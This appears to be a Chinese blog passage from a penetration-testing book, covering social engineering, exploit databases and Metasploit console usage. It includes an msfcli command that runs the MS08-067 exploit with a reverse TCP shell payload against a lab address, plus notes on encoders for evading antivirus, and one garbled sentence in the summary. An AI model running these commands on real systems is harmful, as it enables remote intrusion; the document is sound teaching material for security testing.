  <p style="margin-left:0cm;"><img alt="" class="has" height="114" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085245479.png" width="757"><span style="color:#00b050;">总结</span></p> 
  <p style="margin-left:0cm;">在本篇文章中，阐述了社会工程学在生活中各领域的常见用法。渗透测试人员可以根据实际 情况采取相应的社会工程学策略，获取目标的敏感信息。人性本身非常容易受到这种技术的 欺骗攻击。为了全面介绍社会工程学的技巧，本文讨论了构成人类心理学模型的几个因素， 这些因素包括沟通、环境、知识和沟通模式控制。这些心理学原则可帮助攻击人员根据被测c威、啖以重利和社会关系）。随后，我们演示了 SET&nbsp;&nbsp;&nbsp;&nbsp; 的使用方法，它具有在线进行自动化社会工程学攻击的强大功能。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ▶<strong><span style="color:#FF0000;">漏洞利用：</span></strong><span style="color:#000000;">在仔细检查和发现目标系统中的漏洞之后，就可以使用已有的漏洞利用程序对目标系统进行渗透，某些情况下不得不对</span><span style="color:#00b050;">漏洞利用程序（exploit）</span><span style="color:#000000;">进行额外的研</span>究和修改，，否则可能就无法正常工作。审计人员可以吧客户端漏洞利用程序和社会工程学进行结合，进而控制目标系统，这个阶段的主要任务是控制目标系统。整个流程分为三步，涉及利用前、攻击、攻击后的相关行动。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp; 漏洞利用是渗透测试的一个环节。脆弱性评估不涉及漏洞利用的有关测试。在摸索出目标的漏洞之后，测试人员会验证并真刀真枪地利用目标系统的安全漏洞，以进一步了解目标网络和运营系统，获取更多信息，甚至掌握完全控制权。</p> 
  <p style="margin-left:0cm;"><strong>&nbsp; </strong><strong><span style="color:#00b050;">◆</span></strong><strong><span style="color:#00b050;">漏洞检测</span></strong></p> 
  <p style="margin-left:0cm;">了解特定软件或特定硬件设备的功能，可能就是挖掘其潜在漏洞的第一步。检验漏洞并不容易，绝非是一蹴而就之事。检验人员必须具备扎实的知识基础，了解安全分析的各方面因素。漏洞检测所需的安全分析技能分为以下几种。</p> 
  <p style="margin-left:0cm;"><strong>&nbsp;&nbsp;</strong><strong><span style="color:#00b050;">●</span></strong><strong>&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#00b050;">编程技能：</span></strong>这是称职的守法黑客必须具备的基础素质。掌握某种编程语言的基本原理和编程 方法，是安全测试人员检测程序漏洞的必备技能。除此之外，他还应当深入了解<span style="color:#00b050;">处理器</span>、<span style="color:#00b050;">系统内存</span>、<span style="color:#00b050;">缓冲区</span>、<span style="color:#00b050;">指针</span>、<span style="color:#00b050;">数据类型</span>、<span style="color:#00b050;">寄存器</span>和<span style="color:#00b050;">缓存</span>等基础概念。无论是C/C++、Python、Pert 还是汇编语言，几乎所有编程语言的实现方式都与上述概念有关。根据现有漏洞编写exploit程 序的基本方法，请参阅http://www.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; phreedom.org/presentations/exploit-codedevelopment/exploit-code-development.pdf</p> 
  <p style="margin-left:0cm;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#00b050;">●</span></strong><strong>&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#00b050;">逆向工程：</span></strong>漏洞挖掘工作同样依赖测试人员的逆向工程技能。这种技术分析程序的具体函数、数据结构和算法，可检测出电子设备、软件以及系统中潜藏的漏洞。<strong><span style="color:#00b050;">逆向工程的反编译技术，可在事先不知道内部结构情况下逆向解析出程序的源代码，从而测试程序的错误条件、不完善的函数以及存在缺陷的协议，并能够测试程序的边界条件。</span></strong>专业的安全研究员都 具备很高的逆向工程实战能力。逆向工程可以用于去除软件的版权保护、安全审计、分析技 术竞争情报、侵权鉴定、研究软件的交互性、掌握程序的工作机制，甚至破获敏感数据。逆向工程为应用安全的概念增加了两个抽象层：<strong><span style="color:#00b050;">源代码级审计</span></strong>（source code&nbsp;&nbsp; auditing）和<strong><span style="color:#00b050;">二进</span></strong><strong> </strong><strong><span style="color:#00b050;">制（可执行程序）审计</span></strong>（binary&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; auditing）。如果可以获取程序的源代码，审计人员可采用自 动或手动的方式分析源程序的安全问题，进而解析出可能触发漏洞的边界条件。另一方面， 虽然测试人员可以在没有源码的情况下进行二进制审计，不过这种审计的效果不如源代码审 计理想。二进制审计通常都会用到两种通用类型的辅助工具，即<strong><span style="color:#00b050;">反汇编程序</span></strong><strong> </strong>（disassemblers）和<strong><span style="color:#00b050;">反编译程序</span></strong>（decompilers）。反汇编程序可把编译后的二进制程序反汇编成汇编指令，而反编译器则把编译后的二进制程序反编译成高级程序语言的程序源代码。 然而，无论选用反汇编程序还是反编译程序，成功的逆向安全工作都离不开审计人员扎实的 技术实力和小心谨慎的评估态度。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong><span style="color:#00b050;">●熟悉检测工具</span></strong>：检测漏洞的工作依赖各种调试器、数据挖掘器、模糊测试数据生成器、事件 检测器、代码覆盖分析器、流量分析器和内存监视器。对于检验漏洞的工作来说，漏洞检测 工具十分重要。它们同时还是测试项目的集成测试平台。虽然 Kali&nbsp;&nbsp;&nbsp;&nbsp; Linux收录了不少监测工 具，但是本书并不会详细讲解每款工具。如需持续关注逆向工具的最新动态，请访问在线的 网络资料库：http://www.woodmann.com/collaborative/tools/index.php/Category&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : RCE_Tools。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong><span style="color:#00b050;">●</span></strong><strong>&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#00b050;">构建</span></strong><strong><span style="color:#00b050;">exploit</span></strong><strong><span style="color:#00b050;">和</span></strong><strong><span style="color:#00b050;">payload</span></strong><strong><span style="color:#00b050;">的技术实力</span></strong>：利用漏洞的最后一步工序就是编写漏洞的<span style="color:#00b050;">PoC&nbsp;&nbsp;&nbsp; </span><span style="color:#00b050;">（</span><span style="color:#00b050;">Proof of&nbsp;&nbsp;&nbsp; Concept</span><span style="color:#00b050;">，概念验证）</span>程序，即shellcode。这种程序旨在使渗透测试人员在远程目标主机 上执行自定义的指令。根据逆向工程阶段掌握的应用程序的具体缺陷，测试人员要编写验证漏洞的点睛之笔——shellcode程序。同时，他们还要防止shellcode存在缺陷，尽其所能地避免<span style="color:#00b050;">exploit</span><span style="color:#00b050;">（漏洞利用程序）</span>出现崩溃问题。要让目标系统执行我们编写的程序或我们所要执行的指令，就应当针对漏洞的类型和类别拟定针对性的策略。为了获取目标操作系统的控制权，专业的渗透测试人员会尽力挖掘并综合 使用应用程序的各种安全缺陷。本章的后半部分将通过几个场景演示&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Metasploit框架的使用方法和相关技术。</p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●漏洞和</span></strong><strong><span style="color:#00b050;">exploit</span></strong><strong><span style="color:#00b050;">资料库</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">近些年来，公共领域持续报道了大量的程序漏洞。其屮一些漏洞存在</span></strong><strong><span style="color:#000000;"> PoC</span></strong><strong><span style="color:#000000;">。</span></strong><strong><span style="color:#000000;">PoC&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">程序从一个</span></strong><strong> </strong><strong><span style="color:#000000;">侧面验证了</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; exploit</span></strong><strong><span style="color:#000000;">（利用应用程序漏洞）的可行性。而且，并不是每个被发现的漏洞都会被</span></strong><strong> </strong><strong><span style="color:#000000;">立刻修补。在当今这个时代里，人们争先恐后地获取</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">信息和漏洞信息。渗透测试人员同</span></strong><strong> </strong><strong><span style="color:#000000;">样可以通过公开渠道快速地检索可适用于目标系统的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序。如果具备了一定的编程技巧并掌握解操作系统的具体架构，您还可以将一种类型的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">转换为另一种</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">（例如，将</span></strong><strong><span style="color:#000000;"> Win32</span></strong><strong><span style="color:#000000;">框架的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">转换为</span></strong><strong><span style="color:#000000;">Linux</span></strong><strong><span style="color:#000000;">架构的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序）。本文将介绍一系列的网络资料库，以</span></strong><strong> </strong><strong><span style="color:#000000;">助您追踪漏洞信息或查找适用的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">请注意：网络上公开的漏洞信息并不涵盖全部已知漏洞。此外，虽然部分漏洞存在对应的</span></strong><strong><span style="color:#000000;"> PoC&nbsp;&nbsp;&nbsp; exploit</span></strong><strong><span style="color:#000000;">程序，但是并非所有的安全漏洞信息都有公开的</span></strong><strong><span style="color:#000000;">PoC</span></strong><strong><span style="color:#000000;">代码。在公开的漏洞信息</span></strong><strong> </strong><strong><span style="color:#000000;">中，部分漏洞的描述信息甚至可谓是言之无物。因此，</span></strong><strong><span style="color:#000000;">“</span></strong><strong><span style="color:#000000;">要在研究漏洞时参考多个网上资源</span></strong><strong><span style="color:#000000;">”</span></strong><strong><span style="color:#000000;">已经成为了众多安全审计人员的共识。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">本</span></strong><strong><span style="color:#000000;">文仅罗列了部分网络资源。</span></strong><strong><span style="color:#000000;">Kali&nbsp; Linux</span></strong><strong><span style="color:#000000;">集成了由</span></strong><strong><span style="color:#000000;">“Offensive&nbsp;&nbsp;&nbsp; Security”</span></strong><strong><span style="color:#000000;">提供的资料库，可在您</span></strong><strong> </strong><strong><span style="color:#000000;">的系统上保存</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">的所有漏洞记录，以便您日后参考和使用。如需查看</span></strong><strong><span style="color:#000000;">Exploit-DB</span></strong><strong><span style="color:#000000;">提供的资</span></strong><strong> </strong><strong><span style="color:#000000;">料，</span></strong><strong><span style="color:#00b050;">可在主机的</span></strong><strong><span style="color:#00b050;">shell</span></strong><strong><span style="color:#00b050;">中执行下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#cd&nbsp; /usr/share/exploitdb/ vim&nbsp;&nbsp;&nbsp; files.csv</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将列出</span></strong><strong><span style="color:#000000;">Exploit-DB</span></strong><strong><span style="color:#000000;">收录的所有</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">信息，即本机</span></strong><strong><span style="color:#000000;">/usr/share/exploitdb/platforms/</span></strong><strong><span style="color:#000000;">目</span></strong><strong> </strong><strong><span style="color:#000000;">录下的文件清单和相关描述。</span></strong><strong><span style="color:#000000;">Kali&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">以目标系统的类型对漏洞进行分类（</span></strong><strong><span style="color:#000000;">Window</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Linux</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">HPUX</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Novell</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;"> Solaris</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">BSD</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">IRIX</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">TRU64</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">ASP</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">PHP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">等），并把各种</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">的源代码保</span></strong><strong> </strong><strong><span style="color:#000000;">存在相应的子目录下。这些文件多数是</span></strong><strong><span style="color:#000000;">C</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Perl</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Python</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Ruby</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">PHP</span></strong><strong><span style="color:#000000;">以及其他一些编程技</span></strong><strong> </strong><strong><span style="color:#000000;">术开发的</span></strong><strong><span style="color:#000000;">exploit&nbsp; </span></strong><strong><span style="color:#000000;">源代码。</span></strong><strong><span style="color:#000000;">Kali&nbsp;&nbsp;&nbsp; Linux&nbsp; </span></strong><strong><span style="color:#000000;">已经收录了执行</span></strong><strong><span style="color:#000000;">exploit&nbsp; </span></strong><strong><span style="color:#000000;">程序所需的编译程序和解释程</span></strong><strong> </strong><strong><span style="color:#000000;">序。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">如何从</span></strong><strong><span style="color:#00b050;">exploits</span></strong><strong><span style="color:#00b050;">信息中提取特定信息？</span></strong></p> 
  <p style="margin-left:0cm;"><strong>&nbsp;&nbsp;</strong><strong><span style="color:#000000;">通过操作系统的</span></strong><strong><span style="color:#000000;">Bash&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">指令，可以对文本文件的输出内容进行过滤，从而筛选所需信息。可以通过</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp; searchsploit</span></strong><strong><span style="color:#000000;">指令或者是</span></strong><strong><span style="color:#000000;"> cat&nbsp; &nbsp; files.csv&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;&nbsp; cut -d&nbsp; “,”&nbsp; -f3</span></strong><strong><span style="color:#000000;">指令检索特定的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">。有关</span></strong><strong><span style="color:#000000;"> shell</span></strong><strong><span style="color:#000000;">指令的基本用法，请查阅</span></strong><strong><span style="color:#000000;">http://tldp.org/LDP/abs/html/index.html</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●漏洞利用程序工具集</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Kali&nbsp; Linux&nbsp; </span></strong><strong><span style="color:#000000;">预装了几款十分好用的髙级漏洞利用程序工具集，其中就有</span></strong><strong><span style="color:#000000;">Metasploit </span></strong><strong><span style="color:#000000;">框架</span></strong><strong> </strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">http://www.metasploit.com</span></strong><strong><span style="color:#000000;">）</span></strong><strong><span style="color:#000000;">。本文将不仅会详细地介绍这款工具，而且还会通过大量行之</span></strong><strong> </strong><strong><span style="color:#000000;">有效的应用场景来演示它的使用方法，以加深读者对渗透测试的认识。</span></strong><strong><span style="color:#000000;">Metasploit&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">框架是由</span></strong><strong><span style="color:#000000;"> Ruby</span></strong><strong><span style="color:#000000;">程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。</span></strong><strong><span style="color:#00b050;">Metasploit&nbsp; </span></strong><strong><span style="color:#00b050;">的框架可以分为三大类组成部分：</span></strong><strong><span style="color:#000000;">库</span></strong><strong><span style="color:#00b050;">、</span></strong><strong><span style="color:#000000;">界面</span></strong><strong><span style="color:#00b050;">和</span></strong><strong><span style="color:#000000;">模板</span></strong><strong><span style="color:#00b050;">。</span></strong><strong><span style="color:#000000;">本文重点关注各界面和模板的功能。界面（控制台、</span></strong><strong><span style="color:#000000;">CU</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Web</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">GUI</span></strong><strong><span style="color:#000000;">）基本上是调用功能模板（</span></strong><strong><span style="color:#000000;">漏洞利用、</span></strong><strong> </strong><strong><span style="color:#000000;">有效载荷、辅助工具、加密引擎、</span></strong><strong><span style="color:#000000;">NOP</span></strong><strong><span style="color:#000000;">）的前端</span></strong><strong><span style="color:#000000;">UI</span></strong><strong><span style="color:#000000;">。</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架的每个模板都有不同的作用，它们大体可分为下述模块。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; exploit</span></strong><strong><span style="color:#00b050;">（漏洞利用程序模板）：</span></strong><strong><span style="color:#000000;">包含各种</span></strong><strong><span style="color:#000000;">&nbsp; PoC&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">验证程序，用于验证利用特定漏洞</span></strong><strong> </strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">）的可行性。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; payload</span></strong><strong><span style="color:#00b050;">（有效载荷模板）：</span></strong><strong><span style="color:#000000;">包含各种恶意程序，用于在目标系统上运行任意命令。它可能</span></strong><strong> </strong><strong><span style="color:#000000;">是</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">的一部分，也可能是独立编译的应用程序。</span></strong><strong> </strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">● Auxiliaries</span></strong><strong><span style="color:#00b050;">（辅助工具模板）：</span></strong><strong><span style="color:#000000;">包含一系列扫描、嗅探、拨号测试、指纹识别和其他类型的</span></strong><strong> </strong><strong><span style="color:#000000;">安全评估程序。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; Encoders</span></strong><strong><span style="color:#00b050;">（编码工具模板）：</span></strong><strong><span style="color:#000000;">在渗透测试中，这个模板用来加密有效载荷，以避免被杀毒</span></strong><strong> </strong><strong><span style="color:#000000;">软件、防火墙、</span></strong><strong><span style="color:#000000;">IDS/IPS</span></strong><strong><span style="color:#000000;">以其他类似的反恶意软件检测出来。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; NOP</span></strong><strong><span style="color:#00b050;">（空操作模板）：</span></strong><strong><span style="color:#000000;">这个模板用于在</span></strong><strong><span style="color:#000000;">shellcode&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">中插入</span></strong><strong><span style="color:#000000;">NOP</span></strong><strong><span style="color:#000000;">（汇编指令）。虽然</span></strong><strong><span style="color:#000000;">NOP</span></strong><strong><span style="color:#000000;">不会</span></strong><strong> </strong><strong><span style="color:#000000;">进行实际的操作，但是在构造</span></strong><strong><span style="color:#000000;">shellcode</span></strong><strong><span style="color:#000000;">时可以用来暂时替代</span></strong><strong><span style="color:#000000;">playload</span></strong><strong><span style="color:#000000;">，形成完整的</span></strong><strong><span style="color:#000000;">shellcode </span></strong><strong><span style="color:#000000;">程序。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">为了便于理解，下面将演示两个著名的</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">界面，并讲解相关的指令行选项。每个</span></strong><strong> </strong><strong><span style="color:#000000;">接口都有各自的各有长处和短处。本文强烈建议使用</span></strong><strong><span style="color:#000000;">console</span></strong><strong><span style="color:#000000;">接口，因为它支持该框架的多数功能。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">♙</span></strong><strong> </strong><strong><span style="color:#00b050;">&nbsp; MSFConsole</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">MSFConsole</span></strong><strong><span style="color:#000000;">是效率最高、功能最强大的高度集成的端界面之一。它便于渗透测试人员充分利</span></strong><strong> </strong><strong><span style="color:#000000;">用整个漏洞利用程序框架。如需使用</span></strong><strong><span style="color:#000000;">&nbsp; msfconsole&nbsp; </span></strong><strong><span style="color:#000000;">，可在终端中执行下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfconsole</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将用户带入控制台类型的人机交互界面。如果需要了解所有可用的命令，可以输入下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msf&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; help</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将会显示两类命令。</span></strong><strong><span style="color:#00b050;">一类指令</span></strong><strong><span style="color:#000000;">是在整个框架内通用的常规指令，</span></strong><strong><span style="color:#00b050;">另一类指令</span></strong><strong><span style="color:#000000;">则是面向后台数据库的专用指令。后台数据库里存储着评估参数和评估结果。要想查看某个指令的</span></strong><strong> </strong><strong><span style="color:#000000;">选项说明，可以在有关指令的后面添加</span></strong><strong><span style="color:#000000;">-h</span></strong><strong><span style="color:#000000;">后缀。例如，我们可通过下述指令查看</span></strong><strong><span style="color:#000000;">show</span></strong><strong><span style="color:#000000;">命令的使用说明。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; -h</span></strong></p> 
  <p style="margin-left:0cm;"><span style="color:#000000;">上述命令通常用于显示某个类型的可用模板，或者显示所有模板。常用的指令如下所示。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; auxiliary</span></strong><span style="color:#000000;">：列出全部的辅助工具模板。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; exploits</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">列出框架下所有的漏洞利用程序。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; payloads</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">列出所有平台下的有效载荷。如果已经选定了一个漏洞利用程序，再使用</span> <span style="color:#000000;">该命令就只会显示相关的载荷。例如，</span><span style="color:#000000;">Windows</span><span style="color:#000000;">的载荷将显示与</span><span style="color:#000000;">&nbsp; Windows</span><span style="color:#000000;">相关的漏洞利用模</span> <span style="color:#000000;">板。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp; encoders</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">显示可用的编码工具模板。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp; nops</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">显示所有可用的</span><span style="color:#000000;">NOP&nbsp;&nbsp;&nbsp; </span><span style="color:#000000;">生成程序。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; options</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">显示指定模板的全部设置和选项信息。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp; targets</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">显示</span><span style="color:#000000;">exploit </span><span style="color:#000000;">支持的操作系统类型。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●&nbsp; show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; advanced</span></strong><strong><span style="color:#00b050;">：</span></strong><span style="color:#000000;">列出所有高级配置选项，以便进行微调。</span></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">●</span></strong><strong><span style="color:#00b050;"> MSFCLI</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">MSFCLI</span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;">MSFConsole</span></strong><strong><span style="color:#000000;">相似，它们不仅都采用了命令行界面，而且都可在所有的线程中操作</span></strong><strong> </strong><strong><span style="color:#000000;">绝大多数的模板。然而，</span></strong><strong><span style="color:#000000;">MSFCLI</span></strong><strong><span style="color:#000000;">的自动化程度没有</span></strong><strong><span style="color:#000000;">MSFConsole</span></strong><strong><span style="color:#000000;">高。</span></strong><strong> </strong><strong><span style="color:#000000;">如需启动</span></strong><strong><span style="color:#000000;">msfcli</span></strong><strong><span style="color:#000000;">，可在终端中使用下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">＃</span></strong><strong><span style="color:#00b050;">msfcli&nbsp;&nbsp;&nbsp;&nbsp; –h</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将显示所有可用的模式、模式的相关说明，以及指令所需的参数。请注意</span></strong><strong><span style="color:#000000;">msfcli</span></strong><strong><span style="color:#000000;">需要使用等号给参数进行赋值，而且所有的选项都区分大小写。下述例子演示了选定、运行特定</span></strong><strong><span style="color:#000000;"> exploit</span></strong><strong><span style="color:#000000;">模板的具体方法。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfcli&nbsp; &nbsp;&nbsp; windows/smb/ms08_067_netapi&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; O</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令结尾处的</span></strong><strong><span style="color:#00b050;">选项</span></strong><strong><span style="color:#00b050;">O</span></strong><strong><span style="color:#00b050;">，</span></strong><strong><span style="color:#000000;">用于显示指定</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">的全部选项。下述指令通过</span></strong><strong><span style="color:#000000;">RHOST</span></strong><strong><span style="color:#000000;">参数指定</span></strong><strong> </strong><strong><span style="color:#000000;">目标主机的</span></strong><strong><span style="color:#000000;">IP</span></strong><strong><span style="color:#000000;">地址。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfcli windows/smb/ms08_067_netapi</span></strong><strong> </strong><strong><span style="color:#00b050;">RHOST=192.168.0.7 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; P</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">在设置好</span></strong><strong><span style="color:#000000;">RHOST</span></strong><strong><span style="color:#000000;">参数指定了目标</span></strong><strong><span style="color:#000000;">IP</span></strong><strong><span style="color:#000000;">之后，就应当选取可行的</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">，并执行我们选取的</span></strong><strong><span style="color:#000000;"> exploit</span></strong><strong><span style="color:#000000;">。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfcli&nbsp; &nbsp;&nbsp; windows/smb/ms08_067_netapi </span></strong><strong><span style="color:#00b050;">RHOST=192.168.0.7&nbsp;&nbsp;&nbsp; LHOST =192.168.0.3 PAYLOAD=windows/shell/reverse_tcp&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; E</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">&nbsp;[*] Started&nbsp;&nbsp;&nbsp; reverse&nbsp;&nbsp;&nbsp; handler&nbsp;&nbsp; on 192.168.0.3:4444</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">[*]&nbsp;&nbsp;&nbsp; Automatically&nbsp;&nbsp; detecting the&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; target...</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">[*]&nbsp;&nbsp;&nbsp; Fingerprint:&nbsp; Windows XP Service&nbsp;&nbsp;&nbsp; Pack&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lang:English [*]&nbsp;&nbsp;&nbsp;&nbsp; Selected&nbsp; Target:&nbsp;&nbsp;&nbsp;&nbsp; Windows XP SP2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; English&nbsp; (NX)</span></strong></p> 
